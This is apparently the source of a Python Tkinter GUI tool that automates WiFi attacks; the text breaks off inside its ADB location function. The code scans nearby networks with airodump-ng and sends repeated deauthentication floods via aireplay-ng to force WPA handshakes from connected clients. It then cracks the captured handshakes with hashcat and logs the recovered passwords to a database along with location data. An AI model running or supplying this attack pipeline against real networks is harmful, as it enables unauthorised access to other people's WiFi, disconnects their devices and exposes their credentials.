import os
import csv
import time
import subprocess
from datetime import datetime
import re
import glob
import signal
import shutil
from io import StringIO
import shlex 
import threading
import queue
import tkinter as tk
from tkinter import ttk
from tkinter import scrolledtext
from tkinter import messagebox
from tkinter import filedialog
from PIL import Image, ImageTk
import webbrowser
import traceback
import sqlite3
import json
import socket 

WORDLIST = ""
WIFI_DB_FILE = "wifi_data.db"
TEMP_SCAN_PREFIX = "temp_scan_results"
TEMP_CLIENT_CHECK_PREFIX = "temp_client_check"
HANDSHAKE_DIR = "handshakes"
HC22000_DIR = "hc22000_files"
CRACKED_DIR = "cracked_passwords"

WINDOW_ICON_PATH = "./logo/logonotext.png"
APP_LOGO_PATH = "./logo/logo-transparent-png.png"

monitor_interface_global = None
scan_process_obj = None
capture_process_obj = None
crack_processes = {}
main_queue = queue.Queue()

def log_to_gui(message):
    main_queue.put(("log", f"[{datetime.now().strftime('%H:%M:%S')}] {message}"))

def update_gui_status(message):
    main_queue.put(("status", message))

def check_command(command):
    if shutil.which(command) is None:
        log_to_gui(f"Error: Command '{command}' not found.")
        if command in ["ip", "iw", "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "adb", "hashcat", "hcxpcapngtool", "python3"]:
            log_to_gui("Ensure standard Linux network tools (iproute2, iw),")
            log_to_gui("the aircrack-ng suite, Hashcat, hcxtools, Python 3, and optionally adb are installed and in your PATH.")
        return False
    return True

def cleanup_temp_files(prefix):
    for f in glob.glob(f"{prefix}*"):
        try:
            os.remove(f)
        except OSError as e:
            log_to_gui(f"Warning: Error removing temp file {f}: {e}")

def terminate_process(process, name="Process"):
    if process and process.poll() is None:
        log_to_gui(f"Stopping {name} (PID: {process.pid})...")
        pgid = 0
        try:
            pgid = os.getpgid(process.pid)
            log_to_gui(f"Attempting to terminate process group {pgid} for {name} (SIGTERM).")
            os.killpg(pgid, signal.SIGTERM)
            process.wait(timeout=5)
            log_to_gui(f"{name} terminated successfully.")
        except ProcessLookupError:
            log_to_gui(f"{name} (PID: {process.pid}) already terminated.")
            return
        except subprocess.TimeoutExpired:
            log_to_gui(f"{name} did not terminate with SIGTERM, sending SIGKILL.")
            try:
                if pgid != 0:
                    os.killpg(pgid, signal.SIGKILL)
                else: 
                    os.kill(process.pid, signal.SIGKILL)
                process.wait(timeout=2)
                log_to_gui(f"{name} killed with SIGKILL.")
            except Exception as e_kill:
                log_to_gui(f"Error SIGKILL {name}: {e_kill}")
        except Exception as e_term:
            log_to_gui(f"Error SIGTERM {name}: {e_term}")

def create_dirs():
    try:
        os.makedirs(HANDSHAKE_DIR, exist_ok=True)
        os.makedirs(HC22000_DIR, exist_ok=True)
        os.makedirs(CRACKED_DIR, exist_ok=True)
        os.makedirs("wifi-mapper", exist_ok=True) 
        log_to_gui(f"Ensured directories '{HANDSHAKE_DIR}', '{HC22000_DIR}', '{CRACKED_DIR}', and 'wifi-mapper'.")
    except OSError as e:
        log_to_gui(f"Critical Error creating directories: {e}")
        messagebox.showerror("Directory Error", f"Could not create dirs: {e}. Check permissions.")

def table_exists(conn, table_name):
    cursor = conn.cursor()
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name=?;", (table_name,))
    return cursor.fetchone() is not None

def ensure_db_exists():
    db_existed_before = os.path.exists(WIFI_DB_FILE)
    conn = None
    table_created_now = False
    column_added_now = False
    try:
        conn = sqlite3.connect(WIFI_DB_FILE)
        cursor = conn.cursor()

        if not table_exists(conn, "networks"):
            cursor.execute('''
                CREATE TABLE networks (
                    bssid TEXT PRIMARY KEY,
                    ssid TEXT,
                    power INTEGER,
                    channel TEXT,
                    encryption TEXT,
                    latitude REAL,
                    longitude REAL,
                    last_seen TEXT,
                    handshake_captured INTEGER DEFAULT 0,
                    password TEXT DEFAULT NULL,
                    handshake_filepath TEXT DEFAULT NULL,
                    band TEXT DEFAULT NULL
                )
            ''')
            conn.commit()
            table_created_now = True
        else:
            cursor.execute("PRAGMA table_info(networks)")
            columns = [info[1] for info in cursor.fetchall()]
            if 'band' not in columns:
                try:
                    cursor.execute("ALTER TABLE networks ADD COLUMN band TEXT DEFAULT NULL")
                    conn.commit()
                    column_added_now = True
                except sqlite3.Error as e_alter:
                    log_to_gui(f"Warning: SQLite error attempting to add 'band' column to 'networks' table: {e_alter}")

        if not db_existed_before:
            log_to_gui(f"Database file '{os.path.basename(WIFI_DB_FILE)}' did not exist and was created.")
        elif table_created_now:
            log_to_gui(f"Table 'networks' did not exist in '{os.path.basename(WIFI_DB_FILE)}' and was created (with 'band' column).")
        elif column_added_now:
            log_to_gui(f"Added 'band' column to existing 'networks' table in '{os.path.basename(WIFI_DB_FILE)}'.")
        return True
    except sqlite3.Error as e:
        log_to_gui(f"SQLite error during DB/table ensure/creation for '{os.path.basename(WIFI_DB_FILE)}': {e}")
        return False
    except Exception as e_gen:
        log_to_gui(f"General error during DB/table ensure/creation for '{os.path.basename(WIFI_DB_FILE)}': {e_gen}")
        return False
    finally:
        if conn:
            conn.close()

def get_band_from_channel(channel_val):
    if channel_val is None:
        return "Unknown"
    try:
        if isinstance(channel_val, str):
            match = re.match(r'^\d+', channel_val)
            if match:
                ch_int = int(match.group(0))
            else:
                return "Unknown"
        elif isinstance(channel_val, (int, float)):
            ch_int = int(channel_val)
        else:
            return "Unknown"

        if 1 <= ch_int <= 14:
            return "2.4 GHz"
        elif ch_int >= 36:
            return "5 GHz"
        else:
            return "Unknown"
    except ValueError:
        return "Unknown"
    except Exception:
        return "Unknown"

def get_interfaces():
    interfaces = []
    if not check_command("ip"):
        return []
    try:
        result_ip = subprocess.run(["ip", "-o", "link", "show"], capture_output=True, text=True, check=True, timeout=5)
        potential_interfaces = re.findall(r'^\d+:\s+([a-zA-Z0-9._-]+)(?:@\w+)?:\s+<.*?>.*\s+(?:link/(?:ether|ieee802.11)|ether)\s', result_ip.stdout, re.MULTILINE)
        if not potential_interfaces:
            log_to_gui("No network interfaces found via 'ip link'.")
            return []

        if check_command("iw"):
            checked_interfaces = []
            for iface in potential_interfaces:
                if iface == 'lo' or iface.startswith(('docker', 'veth', 'vmnet', 'virbr', 'bond', 'br-', 'eth', 'enp', 'eno', 'ens')):
                    continue
                try:
                    iw_check = subprocess.run(["iw", "dev", iface, "info"], capture_output=True, text=True, timeout=3)
                    if iw_check.returncode == 0 and re.search(r'\s+type\s+(managed|monitor|ap|mesh)\b', iw_check.stdout):
                        checked_interfaces.append(iface)
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    log_to_gui(f"Warning: 'iw' check failed for {iface}.")
                except Exception as e_iw:
                    log_to_gui(f"Warning: Error checking {iface} with iw: {e_iw}")
            interfaces = checked_interfaces
            log_to_gui(f"Wireless interfaces verified via 'iw': {', '.join(interfaces) if interfaces else 'None'}")
        else:
            interfaces = [iface for iface in potential_interfaces if not (iface == 'lo' or iface.startswith(('docker', 'veth', 'vmnet', 'virbr', 'bond', 'br-', 'eth', 'enp', 'eno', 'ens')))]
            log_to_gui("Warning: 'iw' not found. Using basic interface name filtering.")
            log_to_gui(f"Potential wireless interfaces (unverified): {', '.join(interfaces) if interfaces else 'None'}")
        return interfaces
    except Exception as e:
        log_to_gui(f"Error getting interfaces: {e}")
        return []

def monitor_mode_task(interface):
    global monitor_interface_global
    log_to_gui(f"--- Activating Monitor Mode on {interface} ---")
    if not all(check_command(cmd) for cmd in ["sudo", "airmon-ng", "iw"]):
        main_queue.put(("monitor_result", None))
        return

    subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True, text=True, timeout=15)
    log_to_gui("'airmon-ng check kill' executed.")
    time.sleep(2)

    monitor_cmd_list = ["sudo", "airmon-ng", "start", interface]
    monitor_interface = None
    try:
        result = subprocess.run(monitor_cmd_list, capture_output=True, text=True, check=True, timeout=20)
        log_to_gui(f"Airmon-ng output:\n{result.stdout}")
        match = re.search(r'(?:monitor mode vif enabled|enabled monitor mode|monitor mode enabled).*(?:for \[phy\d+\](\w+)|on\s+([^\s\(]+))', result.stdout, re.IGNORECASE | re.MULTILINE)
        mon_iface_cand = (match.group(1) or match.group(2)).strip() if match else None

        if mon_iface_cand:
            iw_info_res = subprocess.run(["iw", "dev", mon_iface_cand, "info"], capture_output=True, text=True, timeout=5, check=True)
            if "type monitor" in iw_info_res.stdout:
                monitor_interface = mon_iface_cand
                log_to_gui(f"Monitor mode confirmed on {monitor_interface} via 'iw'.")
            else:
                log_to_gui(f"Warning: 'iw' does not report 'type monitor' for {mon_iface_cand}.")
        else:
            iw_dev_res = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5, check=True)
            monitor_match_iw = re.search(r'Interface\s+(\w+).*?\n\s+type\s+monitor', iw_dev_res.stdout, re.DOTALL)
            if monitor_match_iw:
                monitor_interface = monitor_match_iw.group(1)
                log_to_gui(f"Monitor interface detected via fallback 'iw dev': {monitor_interface}")
            else:
                log_to_gui("Fallback detection failed for monitor interface.")
    except subprocess.CalledProcessError as e:
        log_to_gui(f"Error with airmon-ng: {e.stderr.strip() if e.stderr else e.stdout.strip()}")
        try:
            iw_info_res = subprocess.run(["iw", "dev", interface, "info"], capture_output=True, text=True, timeout=5)
            if iw_info_res.returncode == 0 and "type monitor" in iw_info_res.stdout:
                monitor_interface = interface
                log_to_gui(f"{interface} is already in monitor mode (fallback check).")
        except Exception:
            pass
    except Exception as e:
        log_to_gui(f"Unexpected error activating monitor mode: {e}")

    monitor_interface_global = monitor_interface
    main_queue.put(("monitor_result", monitor_interface))

def stop_monitor_mode_task(interface):
    global monitor_interface_global
    if not interface:
        main_queue.put(("monitor_stopped", (False, interface)))
        return
    log_to_gui(f"--- Stopping Monitor Mode on {interface} ---")
    success = False
    try:
        subprocess.run(["sudo", "airmon-ng", "stop", interface], check=True, timeout=20, capture_output=True, text=True)
        monitor_interface_global = None
        success = True
        log_to_gui(f"Monitor mode stopped on {interface}.")
        original_iface = interface.replace("mon", "")
        if original_iface != interface and check_command("ip"): 
            subprocess.run(["sudo", "ip", "link", "set", original_iface, "up"], timeout=5, check=False, capture_output=True)
            log_to_gui(f"Attempted to bring {original_iface} UP.")
    except Exception as e:
        log_to_gui(f"Error stopping monitor mode on {interface}: {e}")
    main_queue.put(("monitor_stopped", (success, interface)))

def scan_wifi_networks_task(interface, duration=25):
    global scan_process_obj
    log_to_gui(f"\n--- Scanning WiFi on {interface} ({duration}s) ---")
    if not check_command("airodump-ng"):
        main_queue.put(("scan_result", []))
        return
    cleanup_temp_files(TEMP_SCAN_PREFIX)
    scan_file_base = os.path.join(os.getcwd(), TEMP_SCAN_PREFIX)
    if not re.match(r'^[a-zA-Z0-9._-]+$', interface): 
        log_to_gui(f"Invalid interface name: {interface}")
        main_queue.put(("scan_result", []))
        return

    scan_cmd = ["sudo", "airodump-ng", interface, "--band", "abg", "--output-format", "csv", "-w", scan_file_base, "--write-interval", "1"]
    networks = []
    try:
        scan_process_obj = subprocess.Popen(scan_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        for i in range(duration):
            if scan_process_obj.poll() is not None:
                err_out = scan_process_obj.stderr.read() if scan_process_obj.stderr else ""
                log_to_gui(f"Scan process ended prematurely. Stderr: {err_out}")
                break
            time.sleep(1)
            if i % 5 == 0 and i > 0:
                update_gui_status(f"Scanning... {duration-i}s left")
        else: 
            log_to_gui("Scan duration finished.")
    except Exception as e:
        log_to_gui(f"Scan error: {e}")
    finally:
        if scan_process_obj and scan_process_obj.poll() is None:
            terminate_process(scan_process_obj, "Network Scan")
        scan_process_obj = None

    scan_files = glob.glob(f"{scan_file_base}-*.csv")
    if not scan_files:
        log_to_gui("No scan CSV files found.")
        main_queue.put(("scan_result", []))
        return
    latest_scan_file = max(scan_files, key=os.path.getctime)
    try:
        with open(latest_scan_file, "r", encoding="utf-8", errors='ignore') as f:
            content = f.read()
        networks = parse_airodump_csv(content)
    except Exception as e:
        log_to_gui(f"Error parsing {latest_scan_file}: {e}")
    finally:
        cleanup_temp_files(TEMP_SCAN_PREFIX) 
    networks.sort(key=lambda x: x.get("power", -100), reverse=True)
    main_queue.put(("scan_result", networks))

def parse_airodump_csv(csv_content):
    networks = []
    try:
        parts = re.split(r'\r?\n\s*Station MAC,', csv_content, maxsplit=1)
        ap_section = parts[0]
        ap_reader = csv.reader(StringIO(ap_section))
        header = None
        indices = {}
        target_keys = {
            "BSSID": ["BSSID"], "channel": ["channel", " CH"], "ESSID": ["ESSID"], "Power": ["Power"],
            "Privacy": ["Privacy"], "Cipher": ["Cipher"], "Authentication": ["Authentication"], "Encryption": ["Encryption"]
        }

        for row in ap_reader:
            row = [field.strip() for field in row]
            if not row or len(row) < 3: 
                continue

            if not header and any(h_name in row for key, possible_headers in target_keys.items() for h_name in possible_headers if key in ["BSSID", "ESSID"]):
                header = row
                for key, possible_headers in target_keys.items():
                    idx = -1
                    for hdr_name_part in possible_headers: 
                        try:
                            idx = header.index(next(h_full for h_full in header if hdr_name_part in h_full))
                            break 
                        except StopIteration: 
                            continue 
                        except ValueError: 
                            continue
                    indices[key] = idx

                if indices.get("BSSID", -1) == -1 or indices.get("channel", -1) == -1 or indices.get("ESSID", -1) == -1:
                    log_to_gui("Warning: Essential CSV columns (BSSID, Channel, ESSID) not found in header.")
                    return [] 
                continue 

            if header: 
                try:
                    bssid = row[indices["BSSID"]]
                    if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', bssid): 
                        continue

                    channel_str = row[indices["channel"]]
                    channel = int(channel_str) if channel_str.isdigit() else channel_str 
                    essid_str = row[indices["ESSID"]]
                    essid = essid_str.replace('\x00', '').strip() or "<Hidden>" 

                    power_str = row[indices["Power"]] if indices.get("Power", -1) != -1 and len(row) > indices["Power"] else "-100"
                    power = int(power_str.strip()) if power_str.strip().lstrip('-').isdigit() else -100

                    security_parts = []
                    for sec_key in ["Privacy", "Cipher", "Authentication", "Encryption"]: 
                        idx_sec = indices.get(sec_key, -1)
                        if idx_sec != -1 and len(row) > idx_sec and row[idx_sec].strip():
                            security_parts.append(row[idx_sec].strip())
                    
                    seen_security_parts = set()
                    unique_security_parts = [x for x in security_parts if not (x in seen_security_parts or seen_security_parts.add(x))]

                    full_encryption_str = " ".join(part for part in unique_security_parts if part and part.upper() != "OPN").strip()
                    if not full_encryption_str: 
                        full_encryption_str = "OPN" if any(part.upper() == "OPN" for part in unique_security_parts) else "Unknown"

                    full_encryption_str = full_encryption_str.replace("WPA2 WPA", "WPA/WPA2").replace("WPA WPA2", "WPA/WPA2").replace("WPA2WPA", "WPA/WPA2")
                    full_encryption_str = re.sub(r'\s+', ' ', full_encryption_str).replace("PSK PSK", "PSK") 
                    
                    if "WPA3" in full_encryption_str and "WPA2" in full_encryption_str:
                        if "SAE" in full_encryption_str and "PSK" in full_encryption_str:
                             full_encryption_str = "WPA3/WPA2 (SAE/PSK)"
                        elif "SAE" in full_encryption_str:
                            full_encryption_str = "WPA3/WPA2 (SAE)"
                        elif "PSK" in full_encryption_str:
                            full_encryption_str = "WPA3/WPA2 (PSK)"
                        else: 
                            full_encryption_str = "WPA3/WPA2"


                    networks.append({
                        "bssid": bssid, "ssid": essid, "power": power,
                        "channel": channel, "encryption": full_encryption_str
                    })
                except (IndexError, ValueError) as e_row:
                    log_to_gui(f"Row parse error (expected fields missing or wrong type): {row} -> {e_row}")
                except Exception as e_fatal_row: 
                    log_to_gui(f"Unexpected row parse error: {row} -> {e_fatal_row}")
                    traceback.print_exc() 
    except Exception as e_parse:
        log_to_gui(f"CSV parse critical error: {e_parse}")
        traceback.print_exc()
    return networks

def check_for_clients_task(interface, bssid, channel):
    log_to_gui(f"\nChecking clients on {bssid} (Ch: {channel})...")
    if not check_command("airodump-ng"):
        main_queue.put(("client_check_result", (bssid, False, "airodump-ng error")))
        return
    cleanup_temp_files(TEMP_CLIENT_CHECK_PREFIX) 
    safe_bssid = bssid.replace(':', '-') 
    check_file_base = os.path.join(os.getcwd(), f"{TEMP_CLIENT_CHECK_PREFIX}_{safe_bssid}")
    if not (re.match(r'^[a-zA-Z0-9._-]+$', interface) and \
            re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', bssid) and \
            str(channel).isdigit()):
        main_queue.put(("client_check_result", (bssid, False, "invalid params")))
        return

    check_cmd = ["sudo", "airodump-ng", "--bssid", bssid, "-c", str(channel), interface, "--output-format", "csv", "-w", check_file_base, "--write-interval", "1"]
    check_proc = None
    found_clients = False
    status_message = "No clients found"
    duration = 15 
    try:
        check_proc = subprocess.Popen(check_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        for _ in range(duration): 
            if check_proc.poll() is not None:
                log_to_gui("Client check process ended.")
                break
            time.sleep(1)
        else:
            log_to_gui("Client check duration finished.")
    except Exception as e:
        log_to_gui(f"Client check start error: {e}")
        status_message = "Start Error"
    finally:
        if check_proc and check_proc.poll() is None:
            terminate_process(check_proc, f"Client Check ({bssid})")

    if "Error" not in status_message: 
        csv_files = glob.glob(f"{check_file_base}-*.csv")
        if csv_files:
            latest_csv = max(csv_files, key=os.path.getctime)
            try:
                with open(latest_csv, "r", encoding="utf-8", errors='ignore') as f:
                    content = f.read()
                
                parts = re.split(r'\r?\n\s*Station MAC,', content, maxsplit=1)
                if len(parts) > 1: 
                    client_reader = csv.reader(StringIO(parts[1]))
                    client_count = 0
                    for row in client_reader:
                        row = [field.strip() for field in row if field.strip()] 
                        if row and len(row) > 5 and \
                           re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', row[0]) and \
                           row[5].strip() == bssid and row[0].lower() != 'ff:ff:ff:ff:ff:ff': 
                            found_clients = True
                            client_count += 1
                    if found_clients:
                        status_message = f"Yes ({client_count})"
                else:
                    status_message = "No client section" 
            except Exception as e:
                log_to_gui(f"Client check parse error: {e}")
                status_message = "Parse Error"
        else:
            status_message = "No CSV Output"
    cleanup_temp_files(check_file_base) 
    main_queue.put(("client_check_result", (bssid, found_clients, status_message)))

def capture_handshake_task(interface, bssid, channel, ssid):
    global capture_process_obj
    log_to_gui(f"\n--- Capturing Handshake: {ssid} ({bssid}) Ch:{channel} ---")
    if not all(check_command(c) for c in ["airodump-ng", "aireplay-ng", "aircrack-ng"]):
        main_queue.put(("capture_result", (bssid, False, "Cmd Error", None)))
        return
    if not (re.match(r'^[a-zA-Z0-9._-]+$', interface) and \
            re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', bssid) and \
            str(channel).isdigit()):
        main_queue.put(("capture_result", (bssid, False, "Invalid Params", None)))
        return

    safe_ssid = re.sub(r'[\\/*?:"<>| ]', '_', ssid) if ssid and ssid != "<Hidden>" else "UnknownSSID"
    cap_file_base = os.path.join(HANDSHAKE_DIR, f"handshake_{safe_ssid}_{bssid.replace(':', '-')}")

    final_cap_filepath = None
    cap_cmd = ["sudo", "airodump-ng", interface, "--bssid", bssid, "-c", str(channel), "-w", cap_file_base, "--output-format", "cap", "--write-interval", "5"]
    captured = False
    status = "Failed"

    try:
        capture_process_obj = subprocess.Popen(cap_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        time.sleep(5) 

        latest_cap_file = get_latest_cap_file(cap_file_base)
        if latest_cap_file and check_handshake_in_file(latest_cap_file):
            captured = True
            status = "Yes (Early)"
            final_cap_filepath = latest_cap_file

        if not captured:
            for attempt in range(3): 
                if capture_process_obj.poll() is not None: 
                    status = "Airodump Error"
                    break
                log_to_gui(f"Deauth attempt {attempt + 1}/3 for {bssid}...")
                deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, interface] 
                subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
                time.sleep(15) 

                latest_cap_file = get_latest_cap_file(cap_file_base)
                if latest_cap_file and check_handshake_in_file(latest_cap_file):
                    captured = True
                    status = f"Yes (Deauth {attempt + 1})"
                    final_cap_filepath = latest_cap_file
                    break
            
            if not captured and status != "Airodump Error": 
                log_to_gui(f"Deauth attempts finished for {bssid}, performing final check...")
                time.sleep(10) 
                latest_cap_file = get_latest_cap_file(cap_file_base)
                if latest_cap_file and check_handshake_in_file(latest_cap_file):
                    captured = True
                    status = "Yes (Final Check)"
                    final_cap_filepath = latest_cap_file

    except Exception as e:
        log_to_gui(f"Handshake capture error: {e}")
        status = "Capture Error"
    finally:
        if capture_process_obj and capture_process_obj.poll() is None:
            terminate_process(capture_process_obj, f"Capture ({ssid})")
        capture_process_obj = None

        if not captured: 
            log_to_gui(f"Handshake NOT detected for {bssid}. Cleaning up capture files related to this attempt...")
            files_to_delete = glob.glob(f"{cap_file_base}*.cap") 
            deleted_count = 0
            if not files_to_delete:
                log_to_gui(f"No .cap files found matching pattern '{os.path.basename(cap_file_base)}*.cap' to delete.")
            else:
                log_to_gui(f"Found {len(files_to_delete)} file(s) to potentially delete for {bssid}.")
                for cap_file_to_del in files_to_delete:
                    try:
                        os.remove(cap_file_to_del)
                        log_to_gui(f"Deleted unsuccessful capture file: {os.path.basename(cap_file_to_del)}")
                        deleted_count +=1
                    except OSError as e_del:
                        log_to_gui(f"Warning: Could not delete capture file {os.path.basename(cap_file_to_del)}: {e_del}")
                if files_to_delete and deleted_count == 0:
                    log_to_gui(f"Warning: Found files to delete but failed to remove any for {bssid}.")
            final_cap_filepath = None 
        
        if captured and final_cap_filepath:
             log_to_gui(f"Handshake capture SUCCESS for {bssid}. File: {os.path.basename(final_cap_filepath)}")
        elif captured: 
            log_to_gui(f"Handshake captured for {bssid}, but final filepath variable was not set correctly. Status: {status}")
        else: 
            log_to_gui(f"Could not capture handshake for {bssid}. Status: {status}")

        main_queue.put(("capture_result", (bssid, captured, status, final_cap_filepath)))


def get_latest_cap_file(file_base_path):
    files = glob.glob(f"{file_base_path}*.cap")
    return max(files, key=os.path.getmtime) if files else None

def check_handshake_in_file(cap_filepath):
    if not cap_filepath or not os.path.exists(cap_filepath):
        return False
    try:
        res = subprocess.run(["aircrack-ng", cap_filepath], capture_output=True, text=True, timeout=10, check=False) 
        return bool(re.search(r'\(\s*[1-9]\d*\s+handshake(?:s)?\s*\)', res.stdout, re.IGNORECASE))
    except subprocess.TimeoutExpired:
        log_to_gui(f"Warning: Handshake check timed out for {os.path.basename(cap_filepath)}.")
    except FileNotFoundError: 
        log_to_gui("Error: aircrack-ng not found for handshake check.")
        return False 
    except Exception as e:
        log_to_gui(f"Handshake check error on {os.path.basename(cap_filepath)}: {e}")
    return False

def crack_handshake_task(bssid, ssid, cap_file, wordlist):
    global crack_processes
    log_to_gui(f"\n--- Cracking with Hashcat: {ssid} ({bssid}) ---")
    status = "Failed"
    key = None
    hc22000_file_path = None 

    if not all(check_command(c) for c in ["hashcat", "hcxpcapngtool"]) or \
       not os.path.exists(wordlist) or not os.path.exists(cap_file) or \
       not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', bssid): 
        status_detail = "Pre-check Failed"
        if not check_command("hashcat"): status_detail = "Hashcat cmd missing"
        elif not check_command("hcxpcapngtool"): status_detail = "hcxpcapngtool cmd missing"
        elif not os.path.exists(wordlist): status_detail = f"Wordlist not found: {os.path.basename(wordlist)}"
        elif not os.path.exists(cap_file): status_detail = f"Capture file (.cap) not found: {os.path.basename(cap_file)}"
        elif not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', bssid): status_detail = "Invalid BSSID format"
        main_queue.put(("crack_result", (bssid, key, status_detail, cap_file)))
        return

    base_cap_filename = os.path.splitext(os.path.basename(cap_file))[0]
    hc22000_file_path = os.path.join(HC22000_DIR, f"{base_cap_filename}.hc22000")
    
    os.makedirs(HC22000_DIR, exist_ok=True) 

    convert_cmd = ["hcxpcapngtool", "-o", hc22000_file_path, cap_file]
    log_to_gui(f"Converting {os.path.basename(cap_file)} to {os.path.basename(hc22000_file_path)}...")
    try:
        convert_proc = subprocess.run(convert_cmd, capture_output=True, text=True, timeout=60, check=True)
        log_to_gui(f"Conversion successful: {os.path.basename(hc22000_file_path)}")
        if not os.path.exists(hc22000_file_path) or os.path.getsize(hc22000_file_path) == 0:
            log_to_gui(f"Error: hcxpcapngtool ran but {os.path.basename(hc22000_file_path)} is empty or missing.")
            log_to_gui(f"hcxpcapngtool stdout: {convert_proc.stdout}")
            log_to_gui(f"hcxpcapngtool stderr: {convert_proc.stderr}")
            status = "Conversion Failed (Empty Output)"
            main_queue.put(("crack_result", (bssid, key, status, cap_file)))
            return
    except subprocess.CalledProcessError as e:
        log_to_gui(f"Error during .cap to .hc22000 conversion: {e}")
        log_to_gui(f"Command: {' '.join(e.cmd)}")
        log_to_gui(f"Stderr: {e.stderr}")
        log_to_gui(f"Stdout: {e.stdout}")
        status = "Conversion Error (hcxpcapngtool)"
        main_queue.put(("crack_result", (bssid, key, status, cap_file)))
        return
    except subprocess.TimeoutExpired:
        log_to_gui(f"Timeout during .cap to .hc22000 conversion for {os.path.basename(cap_file)}.")
        status = "Conversion Timeout"
        main_queue.put(("crack_result", (bssid, key, status, cap_file)))
        return
    except Exception as e_conv: 
        log_to_gui(f"Unexpected error during conversion: {e_conv}")
        status = f"Conversion Error ({type(e_conv).__name__})"
        main_queue.put(("crack_result", (bssid, key, status, cap_file)))
        return

    hashcat_output_file = os.path.join(CRACKED_DIR, f"hashcat_found_{bssid.replace(':', '-')}.txt") 
    if os.path.exists(hashcat_output_file): 
        try: os.remove(hashcat_output_file)
        except OSError: pass

    crack_cmd_hashcat = [
        "hashcat", "-m", "22000", 
        hc22000_file_path,
        wordlist,
        "--outfile", hashcat_output_file, 
        "--outfile-format", "3",          
        "--potfile-disable",              
        "--status",                       
        "--status-timer", "15"           
    ]
    
    log_to_gui(f"Starting Hashcat for {bssid} with {os.path.basename(wordlist)}...")
    crack_proc_hashcat = None
    try:
        crack_proc_hashcat = subprocess.Popen(crack_cmd_hashcat, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        crack_processes[bssid] = crack_proc_hashcat
        
        stdout_hc, stderr_hc = crack_proc_hashcat.communicate(timeout=7200) 

        if os.path.exists(hashcat_output_file) and os.path.getsize(hashcat_output_file) > 0:
            with open(hashcat_output_file, 'r', encoding='utf-8') as f_hc_out:
                for line_content in f_hc_out:
                    potential_key = line_content.strip()
                    if potential_key: 
                        key = potential_key
                        log_to_gui(f"*** HASHCAT KEY FOUND for {bssid} ({ssid}): {key} ***")
                        final_cracked_file = os.path.join(CRACKED_DIR, f"cracked_{bssid.replace(':', '-')}.txt")
                        try:
                            with open(final_cracked_file, 'w', encoding='utf-8') as f_final:
                                f_final.write(key + "\n")
                            log_to_gui(f"Saved key to {os.path.basename(final_cracked_file)}")
                        except Exception as e_write:
                            log_to_gui(f"Warning: Could not write key to final file: {e_write}")
                        break 
            
            if key: 
                status = f"HASHCAT FOUND: {key}"
            else:
                status = "Hashcat: No specific key in output"
                log_to_gui(f"Hashcat output file {os.path.basename(hashcat_output_file)} processed, but no actual key found (e.g., file contains only whitespace).")

        if not key:
            if "All hashes found" in stderr_hc or "Cracked" in stderr_hc: 
                status = "Hashcat: No key for BSSID (Exhausted/All Found)"
            elif "Exhausted" in stderr_hc:
                status = "Hashcat: Wordlist Exhausted"
            elif " ಅಭ್ಯರ್ಥಿ ಪಾಸ್‌ವರ್ಡ್ ಉದ್ದವನ್ನು ಸ್ಥಗಿತಗೊಳಿಸಿ" in stderr_hc: 
                status = "Hashcat: Password length issue" 
            elif "Device #" in stderr_hc and "skip" in stderr_hc :
                status = "Hashcat: Device/Driver Issue"
            elif crack_proc_hashcat.returncode != 0 and crack_proc_hashcat.returncode not in [1, 255]: 
                short_err_msg_hc = (stderr_hc.strip()[:70] + '...') if stderr_hc and len(stderr_hc.strip()) > 70 else stderr_hc.strip()
                if not short_err_msg_hc : short_err_msg_hc = f"(Hashcat Exit Code: {crack_proc_hashcat.returncode})"
                status = f"Hashcat Error: {short_err_msg_hc}"
                log_to_gui(f"Hashcat process for {bssid} exited with code {crack_proc_hashcat.returncode}. Stderr: {stderr_hc.strip()}")
            else: 
                status = "Hashcat: Not Found (No Match)"
        
        if not key and os.path.exists(hashcat_output_file):
            if os.path.getsize(hashcat_output_file) == 0:
                try:
                    os.remove(hashcat_output_file)
                    log_to_gui(f"Removed empty Hashcat output file: {os.path.basename(hashcat_output_file)}")
                except OSError as e_rm:
                    log_to_gui(f"Warning: Could not remove Hashcat output file {os.path.basename(hashcat_output_file)}: {e_rm}")

    except subprocess.TimeoutExpired:
        status = "Hashcat Timeout (7200s)"
        log_to_gui(f"Hashcat cracking timed out for {bssid} after 2 hours.")
        if crack_proc_hashcat: 
             terminate_process(crack_proc_hashcat, f"Hashcat Cracking ({ssid})") 
    except Exception as e_hashcat_exec:
        status = f"Hashcat Exec Error ({type(e_hashcat_exec).__name__})"
        log_to_gui(f"Unexpected Hashcat execution error for {bssid}: {e_hashcat_exec}")
        traceback.print_exc()
    finally:
        if crack_proc_hashcat and crack_proc_hashcat.poll() is None: 
            terminate_process(crack_proc_hashcat, f"Hashcat Cracking ({ssid})")
        if bssid in crack_processes:
            del crack_processes[bssid]
        
    main_queue.put(("crack_result", (bssid, key, status, cap_file)))


def get_location_task():
    log_to_gui("\n--- Attempting ADB Location ---")
    lat, lon = None, None
    if not check_command("adb"):
        main_queue.put(("location_result", (None, None)))
        return
    try:
        dev_res = subprocess.run(["adb", "devices"], capture_output=True, text=True, timeout=10, check=True)
        if not re.search(r'^\S+\s+device$', dev_res.stdout, re.MULTILINE): 
            log_to_gui("No ADB device/emulator found or ready.")
